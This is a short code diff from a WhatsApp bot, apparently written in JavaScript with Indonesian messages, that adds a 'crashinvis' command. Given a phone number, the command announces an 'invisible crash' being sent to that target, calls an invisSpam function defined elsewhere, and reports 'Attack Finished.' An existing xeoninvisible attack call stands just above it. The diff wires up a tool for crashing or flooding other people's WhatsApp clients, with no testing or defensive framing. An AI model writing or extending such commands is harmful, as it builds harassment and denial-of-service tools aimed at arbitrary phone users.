@@ -150,6 +150,16 @@ async function connectToWhatsApp() {
             await xeoninvisible(sock, target);
             await reply(`✅ Done.`);
         }
+          
+        // 3. CRASH INVIS (Moved to separate file)
+        else if (command === 'crashinvis') {
+            if (!args[0]) return reply(`Format: ${config.botPrefix}crashinvis 628xxx`);
+            const target = args[0].replace(/\D/g, '');
+            
+            await reply(`☢️ MENGIRIM INVIS CRASH KE ${target}...`);
+            await invisSpam(sock, target);
+            await reply(`✅ Attack Finished.`);
+        }
 
         // 5. QC
         else if (command === 'qc') {
